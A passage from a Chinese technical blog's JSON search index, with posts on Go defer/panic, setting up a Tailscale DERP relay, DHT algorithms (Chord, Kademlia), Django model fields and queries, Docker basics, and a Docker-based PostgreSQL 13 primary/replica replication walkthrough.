2\u0026#34;) defer func() { r := recover() if r != nil { fmt.Println(\u0026#34;recover:\u0026#34;, r) } }() fmt.Println(\u0026#34;hello world\u0026#34;) panic(\u0026#34;panic\u0026#34;) } // hello world // recover: panic // defer 2 // defer 1 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/defer-%E4%B8%8E-panic/","title":"defer 与 panic"},{"content":"DERP 中继搭建 有域名 环境准备:\nGo 1.20+ 域名和 https 证书 命令行执行 1 2 3 4 5 # 1. 安装，路径在 $GOROOT/bin $GOBIN $GOPATH/bin 中的一个，一般在 $GOPATH/bin go install tailscale.com/cmd/derper@main # 2. 执行命令 derper --hostname=example.com --a=:12345 --certdir=/root/derp --certmode=manual --http-port=-1 --stun=false Docker 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 FROM golang:latest AS builder WORKDIR /app # https://tailscale.com/kb/1118/custom-derp-servers/ RUN go install tailscale.com/cmd/derper@main FROM ubuntu WORKDIR /app ARG DEBIAN_FRONTEND=noninteractive RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y --no-install-recommends apt-utils \u0026amp;\u0026amp; \\ apt-get install -y ca-certificates \u0026amp;\u0026amp; \\ mkdir /app/certs ENV DERP_DOMAIN your-hostname.com ENV DERP_CERT_MODE letsencrypt ENV DERP_CERT_DIR /app/certs ENV DERP_ADDR :443 ENV DERP_STUN true ENV DERP_HTTP_PORT 80 ENV DERP_VERIFY_CLIENTS false COPY --from=builder /go/bin/derper . # docker run -d --name derp --restart=always -p 3478:3478/udp -p 9443:9443 -v /root/certs:/app/certs -e DERP_DOMAIN=example.com -e DERP_ADDR=:9443 -e DERP_CERT_MODE=manual derper CMD /app/derper --hostname=$DERP_DOMAIN \\ --certmode=$DERP_CERT_MODE \\ --certdir=$DERP_CERT_DIR \\ --a=$DERP_ADDR \\ --stun=$DERP_STUN \\ --http-port=$DERP_HTTP_PORT \\ --verify-clients=$DERP_VERIFY_CLIENTS docker run -d --name derp --restart=always -p 3478:3478/udp -p 9443:9443 -v /root/certs:/app/certs -e DERP_DOMAIN=example.com -e DERP_ADDR=:9443 -e DERP_CERT_MODE=manual derper Systemd 1 2 3 4 5 6 7 8 9 10 11 12 13 [Unit] Description=derper After=syslog.target After=network.target [Service] Type=simple ExecStart=/root/go-work/bin/derper --hostname=derp.try-hard.cn --a=:12345 --certdir=/root/derp --certmode=manual --http-port=-1 Restart=always RestartSec=5 [Install] WantedBy=multi-user.target ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/derp-%E4%B8%AD%E7%BB%A7%E6%90%AD%E5%BB%BA/","title":"DERP 中继搭建"},{"content":"DHT 详解 DHT 介绍 DHT（分布式哈希表）是一种用于在分布式环境中存储和查找数据的技术。它基于哈希函数将数据映射到一个大型的分布式网络中的节点上。每个节点负责维护一部分数据的索引，并通过协作来实现高效的数据存储和查找。\nDHT具有以下几个核心概念：\n哈希函数：DHT使用哈希函数将数据键（key）映射到整个网络中的特定节点。哈希函数将任意长度的输入映射为固定长度的输出，通常是一个数字或字符串。 节点：DHT网络由多个节点组成，每个节点都有一个唯一的标识符（通常是一个哈希值）和一个网络地址。节点可以加入和离开网络，并且负责存储和处理与其标识符相关联的数据。 数据存储和定位：当一个节点要存储数据时，它会将数据的键通过哈希函数转换为一个标识符，并找到该标识符在网络中最接近的节点。该节点负责存储该数据项。当需要查找数据时，节点通过哈希函数找到负责该数据项的节点，并从该节点获取数据。 路由表：每个节点都维护一个路由表，其中包含其他节点的信息。路由表根据标识符的空间划分为不同的区域，使节点能够快速定位到其他节点。通过路由表，节点可以有效地进行消息传递和数据查找。 DHT的优点包括高度可扩展性、去中心化、容错性和灵活性。它可以应用于各种分布式系统场景，如对等网络（P2P）文件共享、内容分发网络（CDN）、分布式存储系统等。\nDHT是一个广泛的概念，有许多不同的实现和变体，例如Chord、Kademlia、CAN等。每个实现方式都有其独特的算法和协议，但它们共享相似的基本原则和目标。\nChord 算法 基本要素 Chord 算法的核心在于环形链表和跳表。Chord算法将节点 IP 和资源 Key 使用统一用某个哈希函数（如SHA-1）计算出一个 m 位的 ID 号。将计算出的 ID 号对 2^m 取模后按顺序排列在环上，该环被称为 identifier space。\n对于一个资源 Key ，用哈希函数计算后的 ID 号为 k，该 Key 由环上第一个 ID 号大于 k 的节点负责维护这个资源。\n环上的每个节点都维护着自身的后继节点，如下图中，N1 节点保存着 N8 节点的信息，N8 节点保存着 N14 节点的信息，以此类推就构成了一个环形链表结构。\n如下图， K10 这个资源就由 N14 这个节点进行负责（14 \u0026gt; 10）。\n资源定位 当节点想要查询一个节点的位置时，根据现有结构，他需要依次遍历每一个后继节点，直到查找到资源为止。\n如下图中，节点 N8 想要查找到资源 K54，那么它需要执行 N8 -\u0026gt; N14 -\u0026gt; N21 -\u0026gt; N32 -\u0026gt; N38 -\u0026gt; N42 -\u0026gt; N51 -\u0026gt; N56才能找到 N54 对应的资源。\n查询优化 为了解决链表结构查询资源缓慢的问题，Chord 引入了 前置节点（Chord 环变成了环形双向链表）和finger table，finger table 实际上就是一个跳表。\n在 finger table 中，在每个节点 N 上都维护了最多有 m 项（m为 ID 的位数）的路由表（称为 finger table），用来定位资源。\n如图所示，节点 N8 存储了节点 N14、N21、N32、N42的节点信息。\n节点 N8 需要查询资源 K54 的信息时，将 K54 和自身跳表中的信息进行比较，发现 N42 是距离 K54 距离最近的节点，因此 N8 会直接找 N42 去请求数据，N42 再去重复下面的操作，直到找到 K54 为止。\n数据冗余 在上面的介绍中，资源 k 只会被存储在单一节点 N 上。这种存储方式会导致当节点 N 宕机时，资源 k 无法被其他节点查询到。\n为了解决这种问题，资源数据需要进行冗余存储，以防止节点宕机。\n其冗余策略为，节点 N 在存储资源时，不仅要本机存储，同时也会存放在自己的后继节点中。只存放在后继节点的话安全性依然有不足的情况，因此还可在自身 finger table 中选择节点进行数据存储。\n节点变更 当节点需要加入时，新节点必须要知道整个 Chord 网络中的一个节点信息，新节点和已知节点进行通信，用以知道自身应该加入的位置（参考链表增加节点的流程）。\n当节点需要退出时，需要将自身存储资源移交给前置和后继节点。\nKademlia 算法 Kademlia 算法（后面简称 Kad）的核心在于二叉树搜索。Kad 算法中，资源 ID 和节点 ID 同样是统一编码，在 Kad 算法中 ID 长度为 160bit，可容纳 2 ^ 160 - 1 个资源，这个数量级基本上是整个宇宙中原子的数量。\n在 Kad 算法中使用 XOR （异或）来计算节点 Key 和节点 ID 之间的逻辑距离。\n节点树 在 Kad 算法中，所有节点都可被当作一个二叉树的叶子节点，每一个叶子节点的位置由ID号来确定，如图所示：\n节点树拆分 每一个节点都可以从自己的视角来对二叉树进行拆分，把这颗二叉树分解为一系列连续的，不包含自己的子树。最高层的子树，由整颗树不包含自己的树的另一半组成；下一层子树由剩下部分不包含自己的一半组成；依此类推，直到分割完整颗树。\n拆分规则是从根节点开始，把不包含自己的子树拆分出来，然后在剩下的子树再拆分不包含自己的下一层子树，以此类推，直到最后只剩下自己。\n下图中， 以 1000 节点视角做拆分，可把整个二叉树拆分为四颗子树：\nKad 网络中默认的散列值空间是 m=160（散列值有160bit），所以拆分以后的子树最多有160个。而考虑到实际网络中节点个数远远没有2^160个，所以子树的个数明显小于160个。对于每个节点，当按照自己的视角对二叉树进行拆分以后，会得到n个子树。对于每个子树，如果都分别知道里面1个节点，那么就可以利用这n个节点进行递归路由，从而可以达到整个二叉树的任何一个节点。在拆分子树时，如果 n 选择的较大，会导致大量的桶为空，因为找不到合适匹配的节点；如果n选择的较小，则不能精确匹配节点，一般而言，n 为 log(N)，N 为整个 Kad 网络中的节点数量。\n但是考虑到健壮性（节点可能宕机或者退出），光知道一个显然是不够的，需要知道多个才比较保险。因此 Kad 论文中给出了一个K-桶（K-bucket）的概念：每个节点在完成子树拆分后，要记录每个子树里面的 K 个节点。这里所说的 K 值是一个系统级的常量，一般为 20。K桶实际上就是一个路由表，一个 K桶就是一张路由表，K桶中路由表的条数最大为 K。\nKad 依赖下面的方式选择 K 桶中的 K 个节点：\n当 K 桶中容量未满时，只要属于这个 K 桶的节点都加入 K 桶； 当 K 桶已满，且 K 桶中存在离线节点，则踢出离线节点，将新节点加入 K 桶； 当 K 桶中全都是活跃节点，则将新加入节点保留在额外的附属列表中（作为缓存），当 K 桶中有节点停止响应时，才从附属列表取出节点加入 K 桶。 协议消息 Kademlia协议共有四种消息。\nPING: 测试节点是否仍然在线； STORE: 请求节点存储一个键值对； FIND_NODE: 消息请求的接收者将返回自己桶中离请求键值最近的K个节点； FIND_VALUE: 与FIND_NODE一样，不过当请求的接收者存有请求者所请求的键的时候，它将返回相应键的值。 每一个RPC消息中都包含一个发起者加入的随机值，这一点确保响应消息在收到的时候能够与前面发送的请求消息匹配。\n资源存储与查询 存储资源 节点在存储资源时，需要在网络中找到最多 k 个距离最近的节点，向这些节点发起 STORE 请求，由这些节点负责资源的存储。在查找这 k 个距离最近节点时， Kad 网络采用递归查询的方式进行查询。\n首先初始节点从距离最近的 k 桶中选择 α 个（一般为 3）距离资源 ID 最近的节点，向这 α 个节点发起 FIND_NODE 请求；\n收到 FIND_NODE 请求的节点会从查询自身 k 桶中距离节点 ID 比自身更近的所有节点，如果没有比自身更近的节点，则返回空；\n初始节点收到 FIND_NODE 响应后将它加入列表中，然后再从已知最近的节点中选择尚未发送给 FIND_NODE 消息的节点继续发送 FIND_NODE 节点信息，直到再没有新节点返回为止；\n然后再从已知的所有节点中选出 k 个最近的节点用以存储资源信息。\n查询资源 进行 FIND_VALUE 时和 FIND_NODE 类似，不过在 FIND_VALUE 的过程中，如果当前节点有该资源 ID 的信息，那么则直接返回资源信息。\n由于在 Kad 网络中不能保证强数据一致性，因此会导致返回结果不同，因此下面有几种方式用以增强数据一致性：\n查询数据时选择半数相同的数据作为返回值； 存储数据时带上时间，查询数据时选择最新的数据作为返回结果。 参考：\nhttps://zh.wikipedia.org/wiki/%E5%88%86%E6%95%A3%E5%BC%8F%E9%9B%9C%E6%B9%8A%E8%A1%A8 https://en.wikipedia.org/wiki/Kademlia https://web.archive.org/web/20120722084813/http://pdos.csail.mit.edu/chord/papers/chord-tn.pdf http://pdos.csail.mit.edu/~petar/papers/maymounkov-kademlia-lncs.pdf ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/dht-%E8%AF%A6%E8%A7%A3/","title":"DHT 详解"},{"content":"Django 模型字段说明 在 Django 的 ORM 模型中，有许多内置的模型字段可供开发人员使用，掌握这些字段的作用将帮助开发人员大大节省开发时间\n字段 AutoField: 一个自动递增的整型字段，添加记录时它会自动增长。AutoField字段通常只用于充当数据表的主键；如果在模型中没有指定主键字段，则Django会自动添加一个AutoField字段； BigIntegerField: 64位整型字段； BinaryField: 二进制数据字段，只能通过bytes对其进行赋值； BooleanField: 布尔字段，相对应的HTML标签是 \u0026lt;input type=\u0026ldquo;checkbox\u0026rdquo;\u0026gt;； CharField: 字符串字段，用于较短的字符串，相对应的HTML标签是单行输入框 \u0026lt;input type=\u0026ldquo;text\u0026rdquo;\u0026gt;； TextField: 大容量文本字段，相对应的HTML标签是多行编辑框 \u0026lt;textarea\u0026gt;； CommaSeparatedIntegerField: 用于存放逗号分隔的整数值，相对于普通的CharField，它有特殊的表单数据验证要求； DateField: 日期字段，相对应的HTML标签是 \u0026lt;input type=\u0026ldquo;text\u0026rdquo;\u0026gt;、一个JavaScript日历和一个“Today”快捷按键。有下列额外的可选参数：auto_now，当对象被保存时，将该字段的值设置为当前时间；auto_now_add，当对象首次被创建时，将该字段的值设置为当前时间； DateTimeField: 类似于DateField，但同时支持时间输入； DurationField: 存储时间周期，用Python的timedelta类型构建； EmailField: 一个带有检查Email合法性的CharField； FileField: 一个文件上传字段。在定义本字段时必须传入参数upload_to，用于保存上载文件的服务器文件系统的路径。这个路径必须包含strftime formatting，该格式将被上载文件的date/time替换； FilePathField: 按目录限制规则选择文件，定义本字段时必须传入参数path，用以限定目录； FloatField: 浮点型字段。定义本字段时必须传入参数max_digits和decimal_places，用于定义总位数（不包括小数点和符号）和小数位数； ImageField: 类似于 FileField，同时验证上传对象是否是一个合法图片。它有两个可选参数，即height_field和width_field。如果提供这两个参数，则图片将按提供的高度和宽度规格保存。该字段要求安装Python Imaging库； IntegerField: 用于保存一个整数； IPAddressField: 一个字符串形式的IP地址，比如“129.23.250.2”； NullBooleanField: 类似于BooleanField，但比其多一个None选项； PhoneNumberField: 带有美国风格的电话号码校验的CharField（格式为×××-×××-××××）； PositiveIntegerField： 只能输入非负数的IntegerField。 SlugField： 只包含字母、数字、下画线和连字符的输入字段，它通常用于URL； SmallIntegerField: 类似于IntegerField，但只具有较小的输入范围，具体范围依赖于所使用的数据库； TimeField: 时间字段，类似于DateTimeField，但只能表达和输入时间； URLField: 用于保存URL； USStateField: 美国州名的缩写字段，由两个字母组成； XMLField: XML字符字段，是具有XML合法性验证的TextField。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/django-%E6%A8%A1%E5%9E%8B%E5%AD%97%E6%AE%B5%E8%AF%B4%E6%98%8E/","title":"Django 模型字段说明"},{"content":"Django 条件过滤查询 1. 条件选取 QuerySet filter表示 = ；exclude表示 !=；distinct表示去重复\n语法 功能 __exact 精确查询 __iexact 精确查询，忽略大小写 __contains 包含 __icontains 包含，忽略大小写 __gt 大于 __gte 大于等于 __lt 小于 __lte 小于等于 __in 存在于list中 __startswith 开头包含 __istartswith 开头包含，忽略大小写 __endswith 结尾包含 __iendswith 结尾包含，忽略大小写 __range 在范围里 __year 日期字段查询年 __month 日期字段查询月 __day 日期字段查询日 __isnull 字段为空 2. 多表查询 1 2 3 4 5 6 7 8 9 10 # 模型 class A(models.Model): name = models.CharField(max_length=10） class B(models.Model): a = models.ForeignKey(A) # 查询语句 B.objects.filter(a__name__contains=\u0026#39;XXXX\u0026#39;) # 作用：查询B表中外键aa所对应的表（即A表），表中字段 name 包含searchtitle的B表对象 3. 反向查询 1 2 3 4 5 6 7 8 9 10 11 # 模型 class A(models.Model): name = models.CharField(max_length=10) class B(models.Model): aa = models.ForeignKey(A, related_name=\u0026#34;FAN\u0026#34;) bb = models.CharField(max_length=10) # 查询语句 A.objects.filter(FAN__bb=\u0026#39;XXXX\u0026#39;) # 作用：B.aa=A 且 B.bb=XXXX ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/django-%E6%9D%A1%E4%BB%B6%E8%BF%87%E6%BB%A4%E6%9F%A5%E8%AF%A2/","title":"Django 条件过滤查询"},{"content":"Django 将控制台输出重定向至文件 1 python manage.py test \u0026gt; test.log 2\u0026gt;\u0026amp;1 使用该命令即可将在控制台的输出重定向至日志文件。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/django%E5%B0%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E8%87%B3%E6%96%87%E4%BB%B6/","title":"Django将控制台输出重定向至文件"},{"content":"https://serverfault.com/questions/872316/wierd-arp-issue-with-2-interafces-sharing-same-subnet\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/dns-%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/","title":"DNS 解析失败问题排查"},{"content":"Docker 基础使用 一、获取镜像 docker pull命令可以从镜像仓库上拉取仓库：\n1 docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签] Docker 镜像仓库地址：地址的格式一般是 \u0026lt;域名/IP\u0026gt;[:端口号]。默认地址是 Docker Hub(docker.io)； 仓库名：如之前所说，这里的仓库名是两段式名称，即 \u0026lt;用户名\u0026gt;/\u0026lt;软件名\u0026gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。 Docker Hub 下载镜像非常缓慢，通过配置加速器来实现提速。\n示例（拉取 nginx）镜像：\n1 2 3 4 5 6 7 8 # 搜索 nginx 镜像 $ docker search nginx # 拉取镜像 $ docker pull nginx # 查看本地镜像 $ docker images 二、启动容器 有了镜像后，我们就能够用 docker run 命令以这个镜像为基础启动并运行一个容器。\n以上面的 nginx 为例，如果我们打算启动里面的 nginx 并且进行交互式操作的话，可以执行下面的命令：\n1 $ docker run -d -p 80:80 nginx 此时访问服务器地址就可以看到 nginx 的欢迎界面了。\n参数详解：\n-d：后台运行容器，并返回容器ID； -i：以交互模式运行容器，通常与 -t 同时使用； -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。 三、进入容器 假如说我们这个时候想修改nginx 的欢迎页面，那么我们需要使用 docker exec（不推介 docker attach）进入容器内部进行修改。\n1 2 3 4 5 6 7 8 # 列出运行的容器 docker container ls # 根据容器 ID 进入容器内部 docker exec -it 8d1 bash root@8d188247eafc:/# echo \u0026#39;\u0026lt;h1\u0026gt;Hello, Docker!\u0026lt;/h1\u0026gt;\u0026#39; \u0026gt; /usr/share/nginx/html/index.html root@8d188247eafc:/# exit exit 此时再访问服务器，我们就发现 nginx 的欢迎界面已经发生改变了。\n参数详解：\ndocker exec 后边只用 -i 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。当 -i -t 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。\n如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 docker exec 的原因。\n四、定制镜像 在上面的流程中，我们先启动了一个镜像，再进入命令行内部修改 nginx 的欢迎页。如果我们后续还会在其他地方运行 nginx 并修改欢迎页，如果还是采取上面的方式就会显得太繁琐了。\n这个时候我们可以选择使用 Dockerfile 来定制一个属于我们的镜像：\n新建 Dockerfile 文件，输入以下内容：\n1 2 FROM nginx RUN echo \u0026#39;\u0026lt;h1\u0026gt;Hello, Docker!\u0026lt;/h1\u0026gt;\u0026#39; \u0026gt; /usr/share/nginx/html/index.html 这个 Dockerfile 很简单，一共就两行。涉及到了两条指令，FROM 和 RUN：\nFROM: 所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个 nginx 镜像的容器，再进行修改一样，基础镜像是必须指定的。而 FROM 就是指定 基础镜像，因此一个 Dockerfile 中 FROM 是必备的指令，并且必须是第一条指令。 除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 scratch。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。\nRUN：RUN 指令是用来执行命令行命令的。由于命令行的强大能力，RUN 指令在定制镜像时是最常用的指令之一。其格式有两种：\nshell 格式：RUN \u0026lt;命令\u0026gt;，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 RUN 指令就是这种格式； 1 RUN echo \u0026#39;\u0026lt;h1\u0026gt;Hello, Docker!\u0026lt;/h1\u0026gt;\u0026#39; \u0026gt; /usr/share/nginx/html/index.html exec 格式：RUN [\u0026quot;可执行文件\u0026quot;, \u0026quot;参数1\u0026quot;, \u0026quot;参数2\u0026quot;]，这更像是函数调用中的格式。 **注意：**Dockerfile 中每一个指令都会建立一层，RUN 也不例外。每一个 RUN 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，commit 这一层的修改，构成新的镜像。因此我们在构建时不要写过多的 RUN，避免其构建多层镜像造成冗余。\nDockerfile 文件书写完成后就可以使用docker build命令进行构建了：\n1 2 3 4 5 # 构建镜像，别忘了命令最后面有一个点 docker build -t nginx:v3 . # 查看所有镜像 docker images 构建好镜像之后我们就可以启动容器了：\n1 2 # 将端口映射到 81 端口 docker run -d -p 81:80 nginx:v3 此时访问服务器的 81 端口就可以看到修改后的 nginx 欢迎页面了。\n五、终止容器 现在我们需要终止上面流程运行的容器，此时我们可以使用docker container stop命令终止容器：\n1 2 3 4 5 6 7 8 # 查看运行的容器 docker container ls # 根据 id 终止容器 docker container stop id # 查看所有容器，包括已经终止的容器 docker container ls -a 六、删除容器 我们可以用docker container rm来删除已经被终止的容器，如果要删除一个运行中的容器，可以添加 -f 参数。Docker 会发送 SIGKILL 信号给容器。\n如果需要删除的容器较多，我们可以使用docker container prune命令删除所有已经被终止的容器。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/docker-%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/","title":"Docker 基础使用"},{"content":"Docker 配置 PostgreSQL13 的主从环境 前言 PostgreSQL 数据库支持多种复制解决方案，以构建高可用性，可伸缩，容错的应用程序，其中之一是预写日志（WAL）传送。该解决方案允许使用基于文件的日志传送或流复制，或者在可能的情况下，将两种方法结合使用来实现备用服务器。\n默认情况下，流复制是异步的，其中在将事务提交到主服务器后将数据写入备用服务器。这意味着在主服务器中提交事务与更改在备用服务器中变得可见之间存在很小的延迟。这种方法的一个缺点是，如果主服务器崩溃，则可能无法复制任何未提交的事务，这可能导致数据丢失。\n本次实验将要在 Docker 上安装 PostgreSQL13 并配置主从环境。为了简化演示环境，这里只用一台服务器来演示，通过不同端口来区分。\n安装配置 1. 创建测试网络 创建一个 docker bridge 网络用于测试：\n1 2 3 4 5 6 7 8 9 10 11 # 1. 创建测试网络 docker network create --subnet=172.18.0.0/24 dockernetwork # 2. 查看网络 docker network ls NETWORK ID NAME DRIVER SCOPE 8c8a87e2c6e0 bridge bridge local a8e4916d92c2 dockernetwork bridge local 92951335914e host host local 2e991e7fd5a3 none null local 规划主从库IP端口如下：\n主库：172.18.0.101:5432\n从库：172.18.0.102:5433\n2. 拉取 postgres13 镜像 1 docker pull postgres 3. 创建数据目录 1 2 3 4 5 6 mkdir -p /data/psql/master mkdir -p /data/psql/slave mkdir -p /data/psql/repl chown 999:999 /data/psql/master chown 999:999 /data/psql/slave chown 999:999 /data/psql/repl 4. 运行 master 容器 1 2 3 4 5 6 7 8 docker run -d \\ --network dockernetwork --ip 172.18.0.101 -p 5432:5432 \\ --name master -h master \\ -e \u0026#34;POSTGRES_DB=postgres\u0026#34; \\ -e \u0026#34;POSTGRES_USER=postgres\u0026#34; \\ -e \u0026#34;POSTGRES_PASSWORD=postgres\u0026#34; \\ -v /data/psql/master:/var/lib/postgresql/data \\ postgres 查看容器：\n1 2 3 4 docker ps -a -f network=dockernetwork --format \u0026#34;table {{.Names}}\\t{{.Image}}\\t{{.RunningFor}}\\t{{.Status}}\\t{{.Networks}}\\t{{.Ports}}\u0026#34; NAMES IMAGE CREATED STATUS NETWORKS PORTS master postgres 48 seconds ago Up 46 seconds dockernetwork 0.0.0.0:5432-\u0026gt;5432/tcp, :::5432-\u0026gt;5432/tcp 5. 创建主从流复制专用账号 1 2 3 4 5 6 7 8 9 10 11 12 # 1. 进入容器 docker exec -it master bash # 2. 连接PostgreSQL psql -U postgres # 3. 创建用户规则 CREATE ROLE repuser WITH LOGIN REPLICATION CONNECTION LIMIT 5 PASSWORD \u0026#39;123456\u0026#39;; # 用户名 repuser；最大链接数：5；密码：123456 # 4. 查看规则 \\du 1 2 3 4 5 6 List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} repuser | Replication +| {} | 5 connections | 6. 修改 master 配置文件 1 2 3 4 5 # 1. 进入 master 文件夹 cd /data/psql/master # 2. 在末尾增加规则 echo \u0026#34;host replication repuser 172.18.0.102/24 md5\u0026#34; \u0026gt;\u0026gt; pg_hba.conf 修改 postgresql.conf 配置文件，找到以下几行，取消注释修改配置：\n1 2 3 4 5 6 7 8 archive_mode = on\t# 开启归档模式 archive_command = \u0026#39;/bin/date\u0026#39;\t# 设置归档行为 # 从机连接到主机的并发连接数之总和 max_wal_senders = 10\t# 指定在后备服务器需要为流复制获取日志段文件的情况下, pg_wal目录下所能保留的过去日志文件段的最小尺寸\twal_keep_size = 16\t# 指定一个支持同步复制的后备服务器的列表 synchronous_standby_names = \u0026#39;*\u0026#39; 更多参数详解可参考：19.6. 复制 (postgres.cn)\n7. 重启 master 容器 1 2 3 #使用 pg_ctl stop 安全停止数据库 docker exec -it -u postgres master pg_ctl stop docker start master 8. 创建 slave 容器 1 2 3 4 5 6 7 8 9 docker run -d \\ --network dockernetwork --ip 172.18.0.102 -p 5433:5432 \\ --name slave -h slave \\ -e \u0026#34;POSTGRES_DB=postgres\u0026#34; \\ -e \u0026#34;POSTGRES_USER=postgres\u0026#34; \\ -e \u0026#34;POSTGRES_PASSWORD=postgres\u0026#34; \\ -v /data/psql/slave:/var/lib/postgresql/data \\ -v /data/psql/repl:/var/lib/postgresql/repl \\ postgres 1 2 3 4 5 6 # 查看容器 docker ps -a -f network=dockernetwork --format \u0026#34;table {{.Names}}\\t{{.Image}}\\t{{.RunningFor}}\\t{{.Status}}\\t{{.Networks}}\\t{{.Ports}}\u0026#34; NAMES IMAGE CREATED STATUS NETWORKS PORTS slave postgres 18 seconds ago Up 15 seconds dockernetwork 0.0.0.0:5433-\u0026gt;5432/tcp, :::5433-\u0026gt;5432/tcp master postgres 2 hours ago Up 2 hours dockernetwork 0.0.0.0:5432-\u0026gt;5432/tcp, :::5432-\u0026gt;5432/tcp 9. 同步数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 1. 进入容器 docker exec -it -u postgres slave /bin/bash # 2. 备份主机数据到 repl 文件夹，此处输入在上面设置的密码：123456 pg_basebackup -R -D /var/lib/postgresql/repl -Fp -Xs -v -P -h 172.18.0.101 -p 5432 -U repuser pg_basebackup: initiating base backup, waiting for checkpoint to complete pg_basebackup: checkpoint completed pg_basebackup: write-ahead log start point: 0/2000028 on timeline 1 pg_basebackup: starting background WAL receiver pg_basebackup: created temporary replication slot \u0026#34;pg_basebackup_154\u0026#34; 24264/24264 kB (100%), 1/1 tablespace pg_basebackup: write-ahead log end point: 0/2000138 pg_basebackup: waiting for background process to finish streaming ... pg_basebackup: syncing data to disk ... pg_basebackup: renaming backup_manifest.tmp to backup_manifest pg_basebackup: base backup completed # 3. 备份完成退出容器 exit 10. 重建 slave 容器 通过上一步的初始备份，现在可以使用 /data/psql/repl 里的数据重建 slave容器了。首先删除slave目录，然后将 repl 目录改为 slave，这个目录就是从库的数据目录了：\n1 2 3 4 5 6 7 8 9 10 11 12 # 1. 删除容器 docker rm -f slave # 2. 删除原有文件夹，将 repl 重命名为 slave cd /data/psql/ rm -rf slave mv repl slave cd /data/psql/slave # 3. 查看配置信息 # postgresql.auto.conf 将含有复制所需信息 cat postgresql.auto.conf primary_conninfo = \u0026#39;user=repuser password=123456 channel_binding=prefer host=172.18.0.101 port=5432 sslmode=prefer sslcompression=0 ssl_min_protocol_version=TLSv1.2 gssencmode=prefer krbsrvname=postgres target_session_attrs=any\u0026#39; 重建 slave 容器：\n1 2 3 4 5 6 7 8 docker run -d \\ --network dockernetwork --ip 172.18.0.102 -p 5433:5432 \\ --name slave -h slave \\ -e \u0026#34;POSTGRES_DB=postgres\u0026#34; \\ -e \u0026#34;POSTGRES_USER=postgres\u0026#34; \\ -e \u0026#34;POSTGRES_PASSWORD=postgres\u0026#34; \\ -v /data/psql/slave:/var/lib/postgresql/data \\ postgres 1 2 3 4 5 6 # 查看容器 docker ps -a -f network=dockernetwork --format \u0026#34;table {{.Names}}\\t{{.Image}}\\t{{.RunningFor}}\\t{{.Status}}\\t{{.Networks}}\\t{{.Ports}}\u0026#34; NAMES IMAGE CREATED STATUS NETWORKS PORTS slave postgres 23 seconds ago Up 21 seconds dockernetwork 0.0.0.0:5433-\u0026gt;5432/tcp, :::5433-\u0026gt;5432/tcp master postgres 2 hours ago Up 2 hours dockernetwork 0.0.0.0:5432-\u0026gt;5432/tcp, :::5432-\u0026gt;5432/tcp 11. 查看主从复制信息 1 2 3 4 5 6 ps -aux | grep postgres 主库进程： postgres: walsender repuser 172.18.0.1(52678) streaming 0/3000148 从库进程： postgres: walreceiver streaming 0/3000148 验证主从配置 主机生成数据 1 2 3 # 进入 master 容器，切换到postgres用户 docker exec -it master bash psql -U postgres 1 2 3 4 5 -- 查询复制信息 select * from pg_stat_replication; pid | usesysid | usename | application_name | client_addr | client_hostname... 170\t16384\trepuser\twalreceiver\t172.18.0.1\t52678\t2021-09-29 05:57:30.471391+00... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 -- 创建测试数据库 CREATE DATABASE test; -- 查看所有数据库 \\list List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+------------+------------+----------------------- postgres | postgres | UTF8 | en_US.utf8 | en_US.utf8 | template0 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres test | postgres | UTF8 | en_US.utf8 | en_US.utf8 | (4 rows) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 -- 切换数据库 \\c test -- 创建测试表 CREATE TABLE test ( \u0026#34;id\u0026#34; int4 NOT NULL, \u0026#34;value\u0026#34; varchar(255), PRIMARY KEY (\u0026#34;id\u0026#34;) ); -- 查看创建的表 \\dt List of relations Schema | Name | Type | Owner --------+------+-------+---------- public | test | table | postgres (1 row) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- 向表中插入十条数据 insert into test select generate_series(1,10),md5(random()); -- 查看所有数据 select * from test; id | value ----+---------------------------------- 1 | cfcd208495d565ef66e7dff9f98764da 2 | cfcd208495d565ef66e7dff9f98764da 3 | cfcd208495d565ef66e7dff9f98764da 4 | cfcd208495d565ef66e7dff9f98764da 5 | cfcd208495d565ef66e7dff9f98764da 6 | 